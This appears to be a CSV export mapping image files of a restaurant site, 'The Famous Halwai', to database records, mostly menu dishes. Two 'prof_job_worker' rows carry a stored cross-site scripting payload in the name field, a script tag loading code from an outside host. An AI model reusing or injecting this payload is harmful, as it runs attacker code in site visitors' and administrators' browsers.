211.jpeg,notforgittrack/the-famous-halwai-images/images/211.jpeg,9628,957379406e22d001ca043ffe086bb7b6ae891483caadf0f6d2dfa01349996ea0,8e6d3af7e1b6aade59d533e1739e4cab,DB Mapped (Verified),menu_item_tbl,211,Hara Chana masala,menu_img
212.jpg,notforgittrack/the-famous-halwai-images/images/212.jpg,283472,8f5a8e8cd4396847c938c46a75282e4e46fb5945b7cf8200f486d42e65e4ba57,08775a41e197d8c72607fd5301792931,DB Mapped (Verified),menu_item_tbl,212,Dal Bhukara,menu_img
213.jpg,notforgittrack/the-famous-halwai-images/images/213.jpg,308200,f22bf22b1a54b79562cb401ddf449737ada095947c45153fca557d0ff4727c42,b05e1bf78f121472db8382520cbaf33e,DB Mapped (Verified),menu_item_tbl,213,Dal Makhani,menu_img
214.jpg,notforgittrack/the-famous-halwai-images/images/214.jpg,45785,c7c919c666eaa7cc73eb4b46ef71198b29202dd33730f2742b9f8368954caec8,899e3a1e7905f058641c60a56e9ab049,DB Mapped (Verified),menu_item_tbl,214,Dal Urad,menu_img
214.jpg,notforgittrack/the-famous-halwai-images/images/214.jpg,45785,c7c919c666eaa7cc73eb4b46ef71198b29202dd33730f2742b9f8368954caec8,899e3a1e7905f058641c60a56e9ab049,DB Mapped (Verified),prof_job_worker,214,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
215.jpg,notforgittrack/the-famous-halwai-images/images/215.jpg,169050,077990abd7b153d9f25843be033af7047dddf66ad87a073528cb367e1b786f5e,963dfa79758fe28e37b2e552c62f273c,DB Mapped (Verified),menu_item_tbl,215,Dal Palak,menu_img
216.jpg,notforgittrack/the-famous-halwai-images/images/216.jpg,187519,74b8b180a0288e2dfa421b762e2f6e06ac4ad536448ac1dd17d138c1de5b82da,45876c1a9dcaa53f6a57d281e7f9e538,DB Mapped (Verified),menu_item_tbl,216,Yellow Dal,menu_img
217.jpg,notforgittrack/the-famous-halwai-images/images/217.jpg,204057,a767e5ce6e9bf702a3fc9845ebc6e18ff9383fe40bc12cc4f162d158c3658cc1,4b30945ed7ef01e20bc4992395a62f25,DB Mapped (Verified),menu_item_tbl,217,Masoor Ki Dal,menu_img
218.jpg,notforgittrack/the-famous-halwai-images/images/218.jpg,299204,47aa05445dfebddfa316c2ecb7c9f5e60ab23c643885f97a6ee4da88b1a74260,94cdc63c358d7a2a1ec6917fce23660a,DB Mapped (Verified),menu_item_tbl,218,Rajama,menu_img
219.jpg,notforgittrack/the-famous-halwai-images/images/219.jpg,240796,2a8a664d640124b2c5e8fddd27fe0d1ea98682450c89244fc9e48a7e1880b430,35237c8065c8c408b255eb55cea92f01,DB Mapped (Verified),menu_item_tbl,219,Rajma Masala,menu_img
22.jpg,notforgittrack/the-famous-halwai-images/images/22.jpg,74123,0b23eab0c15efc72abf33cf47ca0a8bf4ab2a7448720ed1fd5d7d4675026f2b5,09d955943b34ba0dbee4816ba1587188,DB Mapped (Verified),menu_item_tbl,22,Kheer,menu_img
22.jpg,notforgittrack/the-famous-halwai-images/images/22.jpg,74123,0b23eab0c15efc72abf33cf47ca0a8bf4ab2a7448720ed1fd5d7d4675026f2b5,09d955943b34ba0dbee4816ba1587188,DB Mapped (Verified),product_item_tbl,22,Kathal ka Achaar,menu_img
220.jpg,notforgittrack/the-famous-halwai-images/images/220.jpg,146364,90588f84219df2a268d9e3c273a78f9fb93656b19d16e64d221000374a4477ae,9bf98883213393f77dc1c3da0d569ddd,DB Mapped (Verified),menu_item_tbl,220,Kadi Pakora,menu_img
221.jpg,notforgittrack/the-famous-halwai-images/images/221.jpg,49801,42051610451802607b6d70b2c19cddd5bf7b2b9d9beef0785c79e2d7ffa3a027,22290cc3b1c49a614476595a467a0675,DB Mapped (Verified),menu_item_tbl,221,TFH Dal Special,menu_img
222.webp,notforgittrack/the-famous-halwai-images/images/222.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,222,Dhai Bada,menu_img
222.webp,notforgittrack/the-famous-halwai-images/images/222.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,222,Dhai Bada,menu_small_img
223.jpeg,notforgittrack/the-famous-halwai-images/images/223.jpeg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,223,Boondi Raita,menu_img
223.jpeg,notforgittrack/the-famous-halwai-images/images/223.jpeg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,223,Boondi Raita,menu_small_img
224.jpeg,notforgittrack/the-famous-halwai-images/images/224.jpeg,8292,e0053582825091f3f2e012f5424dceca9032b735d9124c67c3ca2662b3cc4367,0ea068556bc40e24fdd6e3d0d9a64d8e,DB Mapped (Verified),menu_item_tbl,224,Mix Fruit Raita,menu_img
224.jpeg,notforgittrack/the-famous-halwai-images/images/224.jpeg,8292,e0053582825091f3f2e012f5424dceca9032b735d9124c67c3ca2662b3cc4367,0ea068556bc40e24fdd6e3d0d9a64d8e,DB Mapped (Verified),menu_item_tbl,224,Mix Fruit Raita,menu_small_img
225.jpeg,notforgittrack/the-famous-halwai-images/images/225.jpeg,8497,39e467f30983c7399b5d6391913c66bf1ec4353ce64187a52c0bb297b317ef4d,0fef754850531d457f7df95dc52cc536,DB Mapped (Verified),menu_item_tbl,225,Potato Raita,menu_img
225.jpeg,notforgittrack/the-famous-halwai-images/images/225.jpeg,8497,39e467f30983c7399b5d6391913c66bf1ec4353ce64187a52c0bb297b317ef4d,0fef754850531d457f7df95dc52cc536,DB Mapped (Verified),menu_item_tbl,225,Potato Raita,menu_small_img
226.jpeg,notforgittrack/the-famous-halwai-images/images/226.jpeg,6910,755bc357f4bc1e93a014b627a44d1e5dfce2a5f0a7d1713f039be7d2d11fa51c,d9ccb4f8372d6d8f228650bf359862d1,DB Mapped (Verified),menu_item_tbl,226,Loki Ka Raita,menu_img
226.jpeg,notforgittrack/the-famous-halwai-images/images/226.jpeg,6910,755bc357f4bc1e93a014b627a44d1e5dfce2a5f0a7d1713f039be7d2d11fa51c,d9ccb4f8372d6d8f228650bf359862d1,DB Mapped (Verified),menu_item_tbl,226,Loki Ka Raita,menu_small_img
227.jpeg,notforgittrack/the-famous-halwai-images/images/227.jpeg,8086,6fdd6ae667115c1ce559c76558b3493417ec76f2e01ebd8c73c7cccef78ca712,f4318030ced70d7c2ee7f646584f85af,DB Mapped (Verified),menu_item_tbl,227,Khire ka Raita,menu_img
227.jpeg,notforgittrack/the-famous-halwai-images/images/227.jpeg,8086,6fdd6ae667115c1ce559c76558b3493417ec76f2e01ebd8c73c7cccef78ca712,f4318030ced70d7c2ee7f646584f85af,DB Mapped (Verified),menu_item_tbl,227,Khire ka Raita,menu_small_img
228.jpg,notforgittrack/the-famous-halwai-images/images/228.jpg,14258,d703466b90bb952894d6e7bbddd5e6a8417619721030e501970fcec5b27a9bbe,41e02c5fe7878544fdb7712f3f83df16,DB Mapped (Verified),menu_item_tbl,228,Pineapple Raita,menu_img
228.jpg,notforgittrack/the-famous-halwai-images/images/228.jpg,14258,d703466b90bb952894d6e7bbddd5e6a8417619721030e501970fcec5b27a9bbe,41e02c5fe7878544fdb7712f3f83df16,DB Mapped (Verified),menu_item_tbl,228,Pineapple Raita,menu_small_img
229.jpeg,notforgittrack/the-famous-halwai-images/images/229.jpeg,8524,327d812f278bcad23a0cc4b04b9b3a5e285fad43e0e945161d7ca11add0908db,ec0c88f969cc12d313687e8b065d9d54,DB Mapped (Verified),menu_item_tbl,229,TFH Special Raita,menu_img
229.jpeg,notforgittrack/the-famous-halwai-images/images/229.jpeg,8524,327d812f278bcad23a0cc4b04b9b3a5e285fad43e0e945161d7ca11add0908db,ec0c88f969cc12d313687e8b065d9d54,DB Mapped (Verified),menu_item_tbl,229,TFH Special Raita,menu_small_img
23.jpg,notforgittrack/the-famous-halwai-images/images/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_img
23.jpg,notforgittrack/the-famous-halwai-images/images/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_small_img
23.jpg,notforgittrack/the-famous-halwai-images/images/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),product_item_tbl,23,Lal Mirch ka Bharua Achar,menu_img
230.webp,notforgittrack/the-famous-halwai-images/images/230.webp,23972,63d738238f6b42a4904a1fbaa6d0b29d36b727563a5ad39cf0a2ab638cfdc8f2,a33e40e6e1de87420250929aa1da4b86,DB Mapped (Verified),menu_item_tbl,230,Roasted Papad,menu_img
230.webp,notforgittrack/the-famous-halwai-images/images/230.webp,23972,63d738238f6b42a4904a1fbaa6d0b29d36b727563a5ad39cf0a2ab638cfdc8f2,a33e40e6e1de87420250929aa1da4b86,DB Mapped (Verified),menu_item_tbl,230,Roasted Papad,menu_small_img
231.webp,notforgittrack/the-famous-halwai-images/images/231.webp,46218,35287aef0d9e279871e11ff09c5cb4869763c62a8adc6518d7becf794657fb47,218704947a4de14dd6c2d9e092803b0c,DB Mapped (Verified),menu_item_tbl,231,Lijjat Papad,menu_img
231.webp,notforgittrack/the-famous-halwai-images/images/231.webp,46218,35287aef0d9e279871e11ff09c5cb4869763c62a8adc6518d7becf794657fb47,218704947a4de14dd6c2d9e092803b0c,DB Mapped (Verified),menu_item_tbl,231,Lijjat Papad,menu_small_img
232.jpg,notforgittrack/the-famous-halwai-images/images/232.jpg,27003,4c65db39d6bdd547bb8a9dc5f366bc59f43ab0d75359516eb414a6758d6a885a,7190f2e5b2d7f32b9c84efcc4b741286,DB Mapped (Verified),menu_item_tbl,232,Papad ki Churi,menu_img
232.jpg,notforgittrack/the-famous-halwai-images/images/232.jpg,27003,4c65db39d6bdd547bb8a9dc5f366bc59f43ab0d75359516eb414a6758d6a885a,7190f2e5b2d7f32b9c84efcc4b741286,DB Mapped (Verified),menu_item_tbl,232,Papad ki Churi,menu_small_img
233.jpeg,notforgittrack/the-famous-halwai-images/images/233.jpeg,7448,62927a41c2d91d8294f5a41b741433b8211f58e86aa9eed268341227e93d2743,b8cb73bed74866cab57ec1f6ddb73f87,DB Mapped (Verified),menu_item_tbl,233,Sabudane Ka Papad,menu_img
233.jpeg,notforgittrack/the-famous-halwai-images/images/233.jpeg,7448,62927a41c2d91d8294f5a41b741433b8211f58e86aa9eed268341227e93d2743,b8cb73bed74866cab57ec1f6ddb73f87,DB Mapped (Verified),menu_item_tbl,233,Sabudane Ka Papad,menu_small_img
234.jpg,notforgittrack/the-famous-halwai-images/images/234.jpg,30108,6900419f810f24ac3f44e4a7337e9cb758b93c9c3ff5f850be361a95dfe9f9e9,653aadcf0557560c88e1691ce8231cf7,DB Mapped (Verified),menu_item_tbl,234,Fry Papad,menu_img
234.jpg,notforgittrack/the-famous-halwai-images/images/234.jpg,30108,6900419f810f24ac3f44e4a7337e9cb758b93c9c3ff5f850be361a95dfe9f9e9,653aadcf0557560c88e1691ce8231cf7,DB Mapped (Verified),menu_item_tbl,234,Fry Papad,menu_small_img
235.jpg,notforgittrack/the-famous-halwai-images/images/235.jpg,13338,6617b0de8428fd2d94bdf20a9662fb89b98f489ff32bf2f819470c35d8685030,1ac290d2c80919b37fd2c526f091e3a6,DB Mapped (Verified),menu_item_tbl,235,Allo Ka Papad,menu_img
235.jpg,notforgittrack/the-famous-halwai-images/images/235.jpg,13338,6617b0de8428fd2d94bdf20a9662fb89b98f489ff32bf2f819470c35d8685030,1ac290d2c80919b37fd2c526f091e3a6,DB Mapped (Verified),menu_item_tbl,235,Allo Ka Papad,menu_small_img
236.jpg,notforgittrack/the-famous-halwai-images/images/236.jpg,22003,1a11a020cdb84e7f6f07286577c423cb3792e01eb8f364d4c9aa57e115f026ba,861db002f905a6a9a6674832a31e8b53,DB Mapped (Verified),menu_item_tbl,236,Missi Phulka,menu_img
236.jpg,notforgittrack/the-famous-halwai-images/images/236.jpg,22003,1a11a020cdb84e7f6f07286577c423cb3792e01eb8f364d4c9aa57e115f026ba,861db002f905a6a9a6674832a31e8b53,DB Mapped (Verified),menu_item_tbl,236,Missi Phulka,menu_small_img
237.jpeg,notforgittrack/the-famous-halwai-images/images/237.jpeg,8899,b7ede46c107c61ca7d1e1410c57b560d51d6472b6fa254ca9af191ae2611b7cd,1e4d6d582440f97828273c9f466e441b,DB Mapped (Verified),menu_item_tbl,237,Chupdi Chapati,menu_img
237.jpeg,notforgittrack/the-famous-halwai-images/images/237.jpeg,8899,b7ede46c107c61ca7d1e1410c57b560d51d6472b6fa254ca9af191ae2611b7cd,1e4d6d582440f97828273c9f466e441b,DB Mapped (Verified),menu_item_tbl,237,Chupdi Chapati,menu_small_img
238.jpg,notforgittrack/the-famous-halwai-images/images/238.jpg,43825,b1ffb339b10c4713ae6e20223ea4f066fa81f36c63fb676836939afb4cc15d54,e3dd53add82387b2430e03ed472a02ba,DB Mapped (Verified),menu_item_tbl,238,Makka Ki Roti,menu_img
238.jpg,notforgittrack/the-famous-halwai-images/images/238.jpg,43825,b1ffb339b10c4713ae6e20223ea4f066fa81f36c63fb676836939afb4cc15d54,e3dd53add82387b2430e03ed472a02ba,DB Mapped (Verified),menu_item_tbl,238,Makka Ki Roti,menu_small_img
239.jpg,notforgittrack/the-famous-halwai-images/images/239.jpg,64217,6725257360adfaeb06f0adbbf912aa735087293de116d7c079082b466593687e,763ef511a5dcc2a74896137445411dfc,DB Mapped (Verified),menu_item_tbl,239,Bajre Ki Roti,menu_img
239.jpg,notforgittrack/the-famous-halwai-images/images/239.jpg,64217,6725257360adfaeb06f0adbbf912aa735087293de116d7c079082b466593687e,763ef511a5dcc2a74896137445411dfc,DB Mapped (Verified),menu_item_tbl,239,Bajre Ki Roti,menu_small_img
24.jpg,notforgittrack/the-famous-halwai-images/images/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_img
24.jpg,notforgittrack/the-famous-halwai-images/images/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_small_img
24.jpg,notforgittrack/the-famous-halwai-images/images/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),product_item_tbl,24,Aam ka Achar,menu_img
24.jpg,notforgittrack/the-famous-halwai-images/images/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),website_gallery,24,Amritsari Kulcha,gimage
240.jpg,notforgittrack/the-famous-halwai-images/images/240.jpg,16321,b505b518a6429ea4ba732a8136941fc135c6418c0ed221847c1b9a2b09aa8a2a,68c274bae5a2e10c377885a14ebba6e3,DB Mapped (Verified),menu_item_tbl,240,Karela Sutff,menu_img
240.jpg,notforgittrack/the-famous-halwai-images/images/240.jpg,16321,b505b518a6429ea4ba732a8136941fc135c6418c0ed221847c1b9a2b09aa8a2a,68c274bae5a2e10c377885a14ebba6e3,DB Mapped (Verified),menu_item_tbl,240,Karela Sutff,menu_small_img
241.jpg,notforgittrack/the-famous-halwai-images/images/241.jpg,11813,78af8d714d0abcb79f08c64d8f979c24c1bb6038ba70274dd945d715e260954c,bf55be84d2c83514c5b1d6fa36bcec74,DB Mapped (Verified),menu_item_tbl,241,Bhindi Stuff,menu_img
241.jpg,notforgittrack/the-famous-halwai-images/images/241.jpg,11813,78af8d714d0abcb79f08c64d8f979c24c1bb6038ba70274dd945d715e260954c,bf55be84d2c83514c5b1d6fa36bcec74,DB Mapped (Verified),menu_item_tbl,241,Bhindi Stuff,menu_small_img
242.jpg,notforgittrack/the-famous-halwai-images/images/242.jpg,10596,4c16de6415d9bf4c0e31ff9faa0ded85e1f53a142fe29c7f439b25a0107a43eb,09dc8d17021d1512bcf878c9cc99616d,DB Mapped (Verified),menu_item_tbl,242,Arabi,menu_img
242.jpg,notforgittrack/the-famous-halwai-images/images/242.jpg,10596,4c16de6415d9bf4c0e31ff9faa0ded85e1f53a142fe29c7f439b25a0107a43eb,09dc8d17021d1512bcf878c9cc99616d,DB Mapped (Verified),menu_item_tbl,242,Arabi,menu_small_img
243.jpg,notforgittrack/the-famous-halwai-images/images/243.jpg,16386,ed727ba7e1268b553621b73053b220487226f546a4ded1cffcfad8819a2eb88b,32280c588aa55e25e2857410f23b86e9,DB Mapped (Verified),menu_item_tbl,243,Stuffed Tomato,menu_img
243.jpg,notforgittrack/the-famous-halwai-images/images/243.jpg,16386,ed727ba7e1268b553621b73053b220487226f546a4ded1cffcfad8819a2eb88b,32280c588aa55e25e2857410f23b86e9,DB Mapped (Verified),menu_item_tbl,243,Stuffed Tomato,menu_small_img
244.jpg,notforgittrack/the-famous-halwai-images/images/244.jpg,13853,3fc3dab2cf3f40b9eaf67d3400fa26d67ecb3bf111071c33224a9590065e80e5,a9b1777e96f8b4fa339d5230c28fccc4,DB Mapped (Verified),menu_item_tbl,244,Stuffed Shimla Mirch,menu_img
244.jpg,notforgittrack/the-famous-halwai-images/images/244.jpg,13853,3fc3dab2cf3f40b9eaf67d3400fa26d67ecb3bf111071c33224a9590065e80e5,a9b1777e96f8b4fa339d5230c28fccc4,DB Mapped (Verified),menu_item_tbl,244,Stuffed Shimla Mirch,menu_small_img
245.jpg,notforgittrack/the-famous-halwai-images/images/245.jpg,14332,1370b1ca0345cfe499c6f1aeb413cb2795a12ef47f03a5eddcb31f82bb68a0f6,7d8fa6af9a96928a80ae53f2f8fffa4e,DB Mapped (Verified),menu_item_tbl,245,Sada Puri,menu_img
245.jpg,notforgittrack/the-famous-halwai-images/images/245.jpg,14332,1370b1ca0345cfe499c6f1aeb413cb2795a12ef47f03a5eddcb31f82bb68a0f6,7d8fa6af9a96928a80ae53f2f8fffa4e,DB Mapped (Verified),menu_item_tbl,245,Sada Puri,menu_small_img
246.jpeg,notforgittrack/the-famous-halwai-images/images/246.jpeg,7367,32035ac49824f2f6b60544e2f5f998d708c4364abede08cf7bd2b954fd0b0f3d,cdfc27aaf041e86f778ed7c33fdd5741,DB Mapped (Verified),menu_item_tbl,246,Ajwain Puri,menu_img
246.jpeg,notforgittrack/the-famous-halwai-images/images/246.jpeg,7367,32035ac49824f2f6b60544e2f5f998d708c4364abede08cf7bd2b954fd0b0f3d,cdfc27aaf041e86f778ed7c33fdd5741,DB Mapped (Verified),menu_item_tbl,246,Ajwain Puri,menu_small_img
247.jpeg,notforgittrack/the-famous-halwai-images/images/247.jpeg,10172,87eb9affdd79b982c90eb3f624982194d76ec7501b4c76512382a50d5acc880c,05bb1d90ac9ed27448cdd91640a73c32,DB Mapped (Verified),menu_item_tbl,247,Palak Puri,menu_img
247.jpeg,notforgittrack/the-famous-halwai-images/images/247.jpeg,10172,87eb9affdd79b982c90eb3f624982194d76ec7501b4c76512382a50d5acc880c,05bb1d90ac9ed27448cdd91640a73c32,DB Mapped (Verified),menu_item_tbl,247,Palak Puri,menu_small_img
248.jpg,notforgittrack/the-famous-halwai-images/images/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_img
248.jpg,notforgittrack/the-famous-halwai-images/images/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_small_img
248.jpg,notforgittrack/the-famous-halwai-images/images/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),prof_job_worker,248,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
249.jpeg,notforgittrack/the-famous-halwai-images/images/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_img
249.jpeg,notforgittrack/the-famous-halwai-images/images/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_small_img
25.jpeg,notforgittrack/the-famous-halwai-images/images/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_img
25.jpeg,notforgittrack/the-famous-halwai-images/images/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_small_img
250.jpeg,notforgittrack/the-famous-halwai-images/images/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_img
250.jpeg,notforgittrack/the-famous-halwai-images/images/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_small_img
251.jpeg,notforgittrack/the-famous-halwai-images/images/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_img
251.jpeg,notforgittrack/the-famous-halwai-images/images/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_small_img
252.jpg,notforgittrack/the-famous-halwai-images/images/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_img
252.jpg,notforgittrack/the-famous-halwai-images/images/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_small_img
253.jpg,notforgittrack/the-famous-halwai-images/images/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_img
253.jpg,notforgittrack/the-famous-halwai-images/images/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_small_img
254.jpg,notforgittrack/the-famous-halwai-images/images/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_img
254.jpg,notforgittrack/the-famous-halwai-images/images/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_small_img
255.jpg,notforgittrack/the-famous-halwai-images/images/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_img
255.jpg,notforgittrack/the-famous-halwai-images/images/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_small_img
256.jpg,notforgittrack/the-famous-halwai-images/images/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_img
256.jpg,notforgittrack/the-famous-halwai-images/images/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_small_img
257.jpg,notforgittrack/the-famous-halwai-images/images/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_img
257.jpg,notforgittrack/the-famous-halwai-images/images/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_small_img
258.jpeg,notforgittrack/the-famous-halwai-images/images/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_img
258.jpeg,notforgittrack/the-famous-halwai-images/images/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_small_img
259.jpg,notforgittrack/the-famous-halwai-images/images/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_img
259.jpg,notforgittrack/the-famous-halwai-images/images/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_small_img
26.jpg,notforgittrack/the-famous-halwai-images/images/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_img
26.jpg,notforgittrack/the-famous-halwai-images/images/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_small_img
26.jpg,notforgittrack/the-famous-halwai-images/images/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),product_item_tbl,26,Ginger Garlic Pickle,menu_img
26.jpg,notforgittrack/the-famous-halwai-images/images/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),worke_work_experience,26,cuisine,workproimg
260.jpg,notforgittrack/the-famous-halwai-images/images/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_img
260.jpg,notforgittrack/the-famous-halwai-images/images/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_small_img
261.jpg,notforgittrack/the-famous-halwai-images/images/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_img
261.jpg,notforgittrack/the-famous-halwai-images/images/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_small_img
